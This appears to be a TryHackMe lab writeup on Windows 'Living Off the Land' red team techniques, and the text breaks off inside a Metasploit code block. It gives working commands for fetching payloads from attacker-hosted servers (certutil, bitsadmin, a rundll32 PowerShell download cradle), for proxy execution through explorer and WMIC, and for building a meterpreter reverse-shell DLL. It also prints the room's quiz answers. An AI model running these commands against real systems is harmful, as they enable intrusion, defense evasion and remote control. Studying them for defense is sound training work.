---
Learn the essential concept of "Living Off the Land" in Red Team engagements.
---

# Living Off the Land — Writeup

## Overview
### Living Off the Land — Writeup
### Living Off the Land — Writeup
![](https://tryhackme-images.s3.amazonaws.com/room-icons/a7b40f9a97f3e6d3dcc2cd2e2f45a2c3.png)
### Introduction
What is "Living Off the Land"?
Living Off the Land is a trending term in the red team community. The name is taken from real-life, living by eating the available food on the land. Similarly, adversaries and malware creators take advantage of a target computer's built-in tools and utilities. The term Living Off the Land was introduced at [DerbyCon3](https://www.youtube.com/watch?v=j-r6UonEkUw) in 2013 and has gained more traction in the red team community ever since, becoming an often used and popular technique.
These built-in tools perform various regular activities within the target system or network capabilities; however, they are increasingly used and abused, for example, using the [CertUtil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) tool to download malicious files into the target machine.
The primary idea is to use Microsoft-signed programs, scripts, and libraries to blend in and evade defensive controls. Red teamers do not want to get detected when executing their engagement activities on the target, so utilizing these tools is safer to maintain their stealth.
The following are some categories that Living Off the Land encompasses:
Reconnaissance
Files operations
Arbitrary code execution
Lateral movement
Security product bypass
Learning objectives
Learn about the term Living Off the Land of red team engagements.
Learn about the LOLBAS project and how to use it.
Understand and apply the techniques used in red teaming engagements.
Room prerequisites
Basic knowledge of general hacking techniques.
Completing the Jr. Penetration Tester Learning Path.
TryHackMe Red Team Initial Access module.
We have provided a Windows machine 10 Pro to complete this room. You can use the in-browser feature, or If you prefer to connect via RDP, make sure you deploy the AttackBox or connect to the VPN.
Use the following credentials below.
Machine IP: 10.10.45.70            Username: thm         Password: TryHackM3
### Windows Sysinternals
What is Windows Sysinternals?
Windows Sysinternals is a set of tools and advanced system utilities developed to help IT professionals manage, troubleshoot, and diagnose the Windows operating system in various advanced topics.
Sysinternals Suite is divided into various categories, including:
Disk management
Process management
Networking tools
System information
Security tools
In order to use the Windows Sysinternals tools, we need to accept the Microsoft license agreement of these tools. We can do this by passing the -accepteula argument at the command prompt or by GUI during tool execution.
The following are some popular Windows Sysinternals tools:
AccessChk
Helps system administrators check specified access for files, directories, Registry keys, global objects, and Windows services.
PsExec
A tool that executes programs on a remote system.
ADExplorer
An advanced Active Directory tool that helps to easily view and manage the AD database.
ProcDump
Monitors running processes for CPU spikes and the ability to dump memory for further analysis.
ProcMon
An essential tool for process monitoring.
TCPView	A tool that lists all TCP and UDP connections.
PsTools	The first tool designed in the Sysinternals suite to help list detailed information.
Portmon	Monitors and displays all serial and parallel port activity on a system.
Whois	Provides information for a specified domain name or IP address.
For more information about the Sysinternals suite, you can visit the tools' web page on Microsoft Docs here.
Sysinternals Live
One of the great features of Windows Sysinternals is that there is no installation required. Microsoft provides a Windows Sysinternals service, Sysinternals live, with various ways to use and execute the tools. We can access and use them through:
Web browser (link).
Windows Share
Command prompt
In order to use these tools, you either download them or by entering the Sysinternal Live path \\live.sysinternals.com\tools into Windows Explorer.
Note that since the attached VM does not have internet access, we pre-downloaded the Sysinternal tools in C:\Tools\.
```text
Command Prompt

           
			
C:\Users\thm> C:\Tools\SysinternalsSuite\PsExec64.exe
```
If you are interested in learning more about Windows Sysinternals, we suggest to familiarize yourself with the following additional resources:
TryHackMe room: Sysinternals.
Microsoft Sysinternals Resources website.
Red Team utilization and benefits
While built-in and Sysinternals tools are helpful for system administrators, these tools are also used by hackers, malware, and pentesters due to the inherent trust they have within the operating system. This trust is beneficial to Red teamers, who do not want to get detected or caught by any security control on the target system. Therefore, these tools have been used to evade detection and other blue team controls.
Remember that due to the increase of adversaries and malware creators using these tools nowadays, the blue team is aware of the malicious usage and has implemented defensive controls against most of them.
### LOLBAS Project
What is LOLBAS?
LOLBAS stands for Living Off the Land Binaries And Scripts, a project's primary main goal is to gather and document the Microsoft-signed and built-in tools used as  Living Off the Land techniques, including binaries, scripts, and libraries.
The LOLBAS project is a community-driven repository gathering a collection of binaries, scripts, libraries that could be used for red team purposes. It allows to search based on binaries, functions, scripts, and ATT&CK info. The previous image shows what the LOLBAS project page looks like at this time. If you are interested in more details about the project, you may visit the project's website [here](https://lolbas-project.github.io/).
The LOLBAS website provides a convenient search bar to query all available data. It is straightforward to look for a binary; including the binary name will show the result. However, if we want to look for a specific function, we require providing a / before the function name. For example, if we are looking for all execute functions, we should use /execute. Similarly, in order to look based on types, we should use the # symbol followed by the type name. The following are the types included in the project:
Script
Binary
Libraries
OtherMSBinaries
Tools Criteria
Specific criteria are required for a tool to be a "Living Off the Land" technique and accepted as part of the LOLBAS project:
Microsoft-signed file native to the OS or downloaded from Microsoft.
Having additional interesting unintended functionality not covered by known use cases.
Benefits an APT (Advanced Persistent Threat) or Red Team engagement.
Please note that if you find an exciting binary that adheres to the previously mentioned criteria, you may submit your finding by visiting the [GitHub repo contribution page for more information](https://github.com/LOLBAS-Project/LOLBAS#criteria).
Interesting Functionalities
The LOLBAS project accepts tool submissions that fit one of the following functionalities:
Arbitrary code execution
File operations, including downloading, uploading, and copying files.
Compiling code
Persistence, including hiding data in Alternate Data Streams (ADS) or executing at logon.
UAC bypass
Dumping process memory
DLL injection
![[Pasted image 20220910221222.png]]
Visit the LOLBAS project's website and check out its functionalities. Then, using the search bar, find the ATT&CK ID: T1040. What is the binary's name?
*Pktmon.exe*
Use the search bar to find more information about MSbuild.exe. What is the ATT&CK ID?
*T1127.001*
Use the search bar to find more information about Scriptrunner.exe
*Execute*
In the next task, we will show some of the tools based on the functionalities! Let's go!
*No answer needed*
### File Operations
This task shows commonly used tools based on functionalities and malware activities seen in the real world as well as in the red team engagements.
This task will highlight some interesting "Living Off the Land" techniques that aim to be used in a file operation, including download, upload, and encoding.
Certutil
Certutil is a Windows built-in utility for handling certification services. It is used to dump and display Certification Authority (CA) configuration information and other CA components. Therefore, the tool's normal use is to retrieve certificate information. However, people found that certutil.exe could transfer and encode files unrelated to certification services. The MITRE ATT&CK framework identifies this technique as Ingress tool transfer (T1105).
To illustrate this with an example, we can use certutil.exe to download a file from an attacker's web server and store it in the Window's temporary folder, using the command below. Note that we use the-urlcache and -split -f parameters to enforce the tool to download from the provided URL using the split technique.
```text
Command Prompt

           
			
certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
```
-urlcache to display URL, enables the URL option to use in the command
-split -f  to split and force fetching files from the provided URL.
Also, the certutil.exe can be used as an encoding tool where we can encode files and decode the content of files. ATT&CK T1027 refers to this technique to obfuscate files to make them difficult to discover or analyze.
```text
Command Prompt

           
			
C:\Users\thm> certutil -encode payload.exe Encoded-payload.txt
```
For more information about the tool, you may visit the Microsoft Document here: Microsoft Docs: CertUtil
BITSAdmin
The bitsadmin tool is a system administrator utility that can be used to create, download or upload Background Intelligent Transfer Service (BITS) jobs and check their progress.
https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal
BITS is a low-bandwidth and asynchronous method to download and upload files from HTTP webservers and SMB servers. Additional information about the bitsadmin tool can be found at Microsoft Docs.
Attackers may abuse the BITS jobs to download and execute a malicious payload in a compromised machine. For more information about this technique, you may visit the ATT&CK T1197 page.
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin
Introduce the terminal container content (revisit)
```text
Command Prompt

           
			
C:\Users\thm>bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
```
/Transfer to use the transfer option
/Download we are specifying transfer using download type
/Priority we are setting the priority of the job to be running in the foreground
For more information about the bitsadmin parameters, you can visit the Microsoft documentation of the tool.
FindStr
Findstr is a Microsoft built-in tool used to find text and string patterns in files. The findstr tool is useful in that helps users and system administrators to search within files or parsed output. For example, if we want to check whether port 8080 is open on our machine, then we can pipe the result of netstat to find that port as follows: netstat -an| findstr "445".
However, an unintended way was found by using findstr.exe to download remote files from SMB shared folders within the network as follows,
```text
Command Prompt

           
			
C:\Users\thm>findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
```
/V to print out the lines that don't contain the string provided.
dummystring the text to be searched for; in this case, we provide a string that must not be found in a file.
c:\Windows\Temp\test.exe redirect the output to a file on the target machine.
Note that other tools can be used for the file operation. We suggest visiting the LOLBAS project to check them out.
In the next task, we will introduce some of the tools used to execute files.
![[Pasted image 20220910224019.png]]
Run bitsadmin.exe to download a file of your choice onto the attached Windows VM. Once you have executed the command successfully, an encoded flag file will be created automatically on the Desktop. What is the file name?
(Make sure to supply the exact arguments in order to receive the flag as follows, bitsadmin.exe /transfer /Download /priority Foreground http://10.10.x.x/file ...)
*enc_thm_0YmFiOG_file.txt*
Use the certutil.exe tool to decode the encoded flag file from question #1. In order to decode the file, we use -decode option as follow:
```text
Command Prompt

           
			
C:\Users\thm> certutil -decode Encoded_file payload.txt
```
What is the file content?
### File Execution
This task shows various ways of executing a binary within the operating system. The typical case of executing a binary involves various known methods such as using the command line cmd.exe or from the desktop. However, other ways exist to achieve payload execution by abusing other system binaries, of which one of the reasons is to hide or harden the payload's process. Based on the MITRE ATT&CK framework, this technique is called Signed Binary Proxy Execution or Indirect Command Execution, where the attacker leverages other system tools to spawn malicious payloads. This technique also helps to evade defensive controls.
File Explorer
File Explorer is a file manager and system component for Windows. People found that using the file explorer binary can execute other .exe files. This technique is called Indirect Command Execution, where the explorer.exe tool can be used and abused to launch malicious scripts or executables from a trusted parent process.
The explorer.exe binary is located at:
C:\Windows\explorer.exe for the Windows 32 bits version
C:\Windows\SysWOW64\explorer.exe for the Windows 64 bits version
In order to create a child process of explorer.exe parent, we can execute the following command:
```text
Command Prompt

           
			
C:\Users\thm> explorer.exe /root,"C:\Windows\System32\calc.exe"
```
As a result of the previous command, we popped the calculator on the desktop.
WMIC
Windows Management Instrumentation (WMIC) is a Windows command-line utility that manages Windows components. People found that WMIC is also used to execute binaries for evading defensive measures. The MITRE ATT&CK framework refers to this technique as Signed Binary Proxy Execution (T1218)
```text
Command Prompt

           
			
C:\Users\thm>wmic.exe process call create calc
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 1740;
        ReturnValue = 0;
};

C:\Users\thm>
```
![[Pasted image 20220910224303.png]]
The previous WMIC command creates a new process of a binary of our choice, which in this case calc.exe.
Rundll32
Rundll32 is a Microsoft built-in tool that loads and runs Dynamic Link Library DLL files within the operating system. A red team can abuse and leverage rundll32.exe to run arbitrary payloads and execute JavaScript and PowerShell scripts. The MITRE ATT&CK framework identifies this as Signed Binary Proxy Execution: Rundll32 and refers to it as T1218.
The rundll32.exe binary is located at:
C:\Windows\System32\rundll32.exe for the Windows 32 bits version
C:\Windows\SysWOW64\rundll32.exe for the Windows 64 bits version
Now let's try to execute a calc.exe binary as proof of concept using the rundll32.exe binary:
```text
Command Prompt

           
			
C:\Users\thm> rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```
In the previous command, we used the rundll32.exe binary that embeds a JavaScript component, eval(), to execute the calc.exe binary, a Microsoft calculator.
As we mentioned previously, we can also execute PowerShell scripts using the rundll32.exe. The following command runs a JavaScript that executes a PowerShell script to download from a remote website using rundll32.exe.
```text
Command Prompt

           
			
C:\Users\thm> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
```
As a result of the previous execution, a copy of the script.ps1 downloaded into memory on the target machine.
Read the above and practice these tools on the attached machine!
*No answer needed*
### Application Whitelisting Bypasses
Bypassing Application Whitelisting
Application Whitelisting is a Microsoft endpoint security feature that prevents malicious and unauthorized programs from executing in real-time. Application whitelisting is rule-based, where it specifies a list of approved applications or executable files that are allowed to be present and executed on an operating system. This task focuses on LOLBAS examples that are used to bypass the Windows application whitelisting.
Regsvr32
Regsvr32 is a Microsoft command-line tool to register and unregister Dynamic Link Libraries (DLLs)  in the Windows Registry. The regsvr.exe binary is located at:
C:\Windows\System32\regsvr32.exe for the Windows 32 bits version
C:\Windows\SysWOW64\regsvr32.exe for the Windows 64 bits version
Besides its intended use, regsvr32.exe binary can also be used to execute arbitrary binaries and bypass the Windows Application Whitelisting. According to Red Canary reports, the regsvr32.exe binary is the third most popular ATT&CK technique. Adversaries leverage regsvr32.exe to execute native code or scripts locally or remotely. The technique used in the regsvr32.exe uses trusted Windows OS components and is executed in memory, which is one of the reasons why this technique is also used to bypass application whitelisting.
Let's try to apply this technique in real life. First, we need to create a malicious DLL file using msvenom and set up our  Metasploit listener to receive a reverse shell. Note that we will be creating a malicious file that works for 32bit operating systems. We will be using the regsvr32.exe Application Whitelisting Bypass technique to run a command on a target system.

## Exploitation
```text
Terminal

           
			
user@machine$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload 
No encoder specified, outputting raw payload 
Payload size: 375 bytes 
Final size of dll file: 8704 bytes 

user@machine$ user@machine$ msfconsole -q
```
```text
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
```
```text
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
payload => windows/meterpreter/reverse_tcp
```
```text
